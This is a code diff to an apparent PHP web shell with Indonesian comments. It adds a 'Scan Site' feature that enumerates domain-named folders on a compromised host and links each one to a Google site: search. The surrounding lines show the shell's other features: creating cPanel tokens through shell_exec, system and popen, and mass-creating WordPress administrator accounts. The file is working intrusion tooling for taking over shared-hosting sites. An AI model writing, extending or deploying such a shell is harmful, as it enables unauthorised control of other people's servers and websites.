@@ -1,4 +1,3 @@
-
 <?php
 // Checkpoint-401
 
@@ -549,6 +548,58 @@ if (isset($_POST['buat_token_cpanel'])) {
     if(!$suc_tok && !$res_tok) $h_tok .= "<p style='color:red;'>Gagal eksekusi. Semua fungsi exec (shell_exec, system, popen, dll) mungkin didisable.</p>";
     $h_tok .= "</div>";
     $success_msg = $h_tok;
+}
+// FITUR: SCAN SITE TOOL
+if (isset($_POST['scan_site'])) {
+    $target_scan_dir = isset($default_dir) ? $default_dir : getcwd();
+    $found_domains = [];
+    
+    // Scan folder saat ini
+    if (is_dir($target_scan_dir)) {
+        $items = scandir($target_scan_dir);
+        foreach ($items as $item) {
+            if ($item === '.' || $item === '..') continue;
+            $path = $target_scan_dir . '/' . $item;
+            
+            // Cek jika itu folder DAN namanya mirip domain
+            if (is_dir($path)) {
+                if (preg_match('/^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$/i', $item)) {
+                    $found_domains[] = $item;
+                }
+            }
+        }
+    }
+
+    // Buat tampilan tabel hasil
+    $out_html = "<div style='background:#2e2e2e; padding:15px; border:1px solid #333; border-radius:8px; margin-bottom:15px;'>";
+    $out_html .= "<div style='display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #444; padding-bottom:10px; margin-bottom:10px;'>";
+    $out_html .= "<h4 style='color:#00FF00; margin:0;'>Scan Result: " . count($found_domains) . " Domains</h4>";
+    $out_html .= "<button onclick='this.parentElement.parentElement.style.display=\"none\"' style='background:none; border:none; color:#ff5555; cursor:pointer;'>[ Close ]</button>";
+    $out_html .= "</div>";
+    
+    if (!empty($found_domains)) {
+        $out_html .= "<table class='fManager' style='margin:0;'><thead><tr><th>Domain Name</th><th style='width:100px; text-align:center;'>Check Google</th></tr></thead><tbody>";
+        
+        // SVG Icon Google (Tanpa Background)
+        $googleSvg = '<svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>';
+
+        foreach ($found_domains as $dom) {
+            $link = "https://www.google.com/search?q=site:" . htmlspecialchars($dom);
+            $out_html .= "<tr>";
+            $out_html .= "<td style='color:#fff; font-weight:bold;'>" . htmlspecialchars($dom) . "</td>";
+            $out_html .= "<td style='text-align:center;'>
+                <a href='$link' target='_blank' style='display:inline-block; transition:transform 0.2s;' onmouseover='this.style.transform=\"scale(1.2)\"' onmouseout='this.style.transform=\"scale(1)\"' title='Check site:$dom'>$googleSvg</a>
+            </td>";
+            $out_html .= "</tr>";
+        }
+        $out_html .= "</tbody></table>";
+    } else {
+        $out_html .= "<p style='color:#ccc; padding:10px;'>No folder matching domain pattern found in current directory.</p>";
+    }
+    $out_html .= "</div>";
+    
+    // Tampilkan hasil di variabel pesan sukses agar muncul di atas file list
+    $success_msg = $out_html;
 }
 // B. MASS ADMIN
 if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
@@ -1749,6 +1800,11 @@ a {
         <input type="hidden" name="create_wp_admin" value="1">
         <input type="hidden" name="berkas" value="<?= htmlspecialchars(kunci($default_dir)) ?>">
         <button type="submit" class="btn-modern"><i class="fas fa-user-shield"></i> Create Admin</button>
+      </form>
+      <form method="POST" action="">
+        <input type="hidden" name="scan_site" value="1">
+        <input type="hidden" name="berkas" value="<?= htmlspecialchars(kunci($default_dir)) ?>">
+        <button type="submit" class="btn-modern" style="background-color: #6f42c1;"><i class="fas fa-satellite-dish"></i> Scan Site</button>
       </form>
     </div>
 </div>
